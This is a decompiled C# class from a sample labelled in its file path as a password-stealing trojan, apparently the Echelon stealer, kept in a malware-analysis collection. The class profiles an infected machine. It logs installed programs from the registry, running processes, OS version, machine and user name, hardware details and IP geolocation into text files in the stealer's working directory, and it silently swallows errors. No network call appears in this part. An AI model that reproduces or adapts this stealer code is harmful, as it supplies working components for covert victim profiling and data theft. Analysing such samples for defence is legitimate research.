// Decompiled with JetBrains decompiler
// Type: Echelon.Systemsinfo
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;

namespace Echelon
{
  internal class Systemsinfo
  {
    public static void ProgProc(string Echelon_Dir)
    {
      Systemsinfo.PcInfo(Echelon_Dir);
      using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
      {
        try
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
          foreach (string subKeyName in registryKey.GetSubKeyNames())
          {
            if (registryKey.OpenSubKey(subKeyName).GetValue("DisplayName") is string str)
              streamWriter.WriteLine(str);
          }
        }
        catch
        {
        }
      }
      try
      {
        using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
        {
          foreach (Process process in Process.GetProcesses())
            streamWriter.WriteLine(process.ProcessName.ToString());
        }
      }
      catch
      {
      }
    }

    public static string GpuName()
    {
      try
      {
        string str = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            str = str + managementObject["Description"].ToString() + " ";
        }
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string GetPhysicalMemory()
    {
      try
      {
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher(new ManagementScope(), new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory")).Get();
        long num = 0;
        foreach (ManagementBaseObject managementBaseObject in objectCollection)
        {
          long int64 = Convert.ToInt64(managementBaseObject["Capacity"]);
          num += int64;
        }
        return (num / 1024L / 1024L).ToString();
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string ProcessorId()
    {
      try
      {
        ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in instances)
          empty = (string) managementBaseObject[nameof (ProcessorId)];
        return empty;
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string GetOSInformation()
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
      {
        try
        {
          return ((string) managementObject["Caption"]).Trim() + ", " + (string) managementObject["Version"] + ", " + (string) managementObject["OSArchitecture"];
        }
        catch
        {
        }
      }
      return "BIOS Maker: Unknown";
    }

    public static string GetComputerName()
    {
      try
      {
        ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in instances)
          empty = (string) managementBaseObject["Name"];
        return empty;
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string GetProcessorName()
    {
      try
      {
        ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in instances)
          empty = (string) managementBaseObject["Name"];
        return empty;
      }
      catch
      {
        return "Unknown";
      }
    }

    public static void PcInfo(string Echelon_Dir)
    {
      ComputerInfo computerInfo = new ComputerInfo();
      Size size = Screen.PrimaryScreen.Bounds.Size;
      try
      {
        using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Info.txt", false, Encoding.Default))
        {
          streamWriter.WriteLine("OC verison - " + Environment.OSVersion?.ToString() + " | " + computerInfo.OSFullName + "\nMachineName - " + Environment.MachineName + "/" + Environment.UserName + "\nResolution - " + size.ToString() + "\nCurrent time Utc - " + DateTime.UtcNow.ToString() + "\nCurrent time - " + DateTime.Now.ToString() + "\nCPU - " + Systemsinfo.GetProcessorName() + "\nRAM - " + Systemsinfo.GetPhysicalMemory() + "\nGPU - " + Systemsinfo.GpuName() + "\n\n\nIP Geolocation: " + Help.IP + " " + Help.Country());
          streamWriter.Close();
        }
      }
      catch
      {
      }
    }
  }
}
